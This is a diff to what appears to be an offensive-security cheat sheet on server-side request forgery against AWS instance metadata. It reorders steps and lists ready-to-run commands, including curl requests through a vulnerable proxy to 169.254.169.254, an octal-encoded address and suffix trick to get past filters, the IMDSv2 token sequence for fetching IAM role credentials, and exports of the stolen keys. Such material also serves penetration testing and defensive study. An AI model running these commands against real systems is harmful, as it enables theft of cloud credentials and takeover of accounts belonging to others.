@@ -49,28 +49,24 @@ Applications that blocklist `169.254.169.254` often miss alternative representat
 
 **Suffix filter bypass**: If the SSRF requires URLs ending in `.yaml`/`.json`, append `?a=test.yaml` or `#test.yaml`.
 
-```bash
-# Step 1: confirm SSRF to internal metadata (IMDSv1 — direct GET)
-curl http://<target>/proxy?url=http://169.254.169.254/latest/meta-data/
-# With octal bypass:
-curl http://<target>/proxy?url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/<role>?a=test.yaml
+IMDSv2 is default for new EC2 launches since 2024-03; SSRF must forward the PUT/header or find a v1-optional target.
 
-# IMDSv2 — requires token first (PUT → GET)
-# Step 2a: get token (must go through the SSRF)
+```bash
+# Step 1: try IMDSv2 (token-first) through the SSRF — needs PUT and custom header forwarding
 PUT http://169.254.169.254/latest/api/token
 Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
 # → token returned
 
-# Step 2b: use token to query metadata
 GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
 Header: X-aws-ec2-metadata-token: <token>
-# → role name returned
+# → role name; then repeat with /<role-name> for the credential blob
 
-# Step 3: get credentials for the role
-GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
-# → AccessKeyId, SecretAccessKey, Token, Expiration
+# Fallback: IMDSv1 direct GET (only works if HttpTokens=optional on the instance)
+curl http://<target>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+# With octal bypass on a blocklist:
+curl http://<target>/proxy?url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/<role>?a=test.yaml
 
-# Step 4: export and use
+# Export and use
 export AWS_ACCESS_KEY_ID=ASIA...
 export AWS_SECRET_ACCESS_KEY=...
 export AWS_SESSION_TOKEN=...
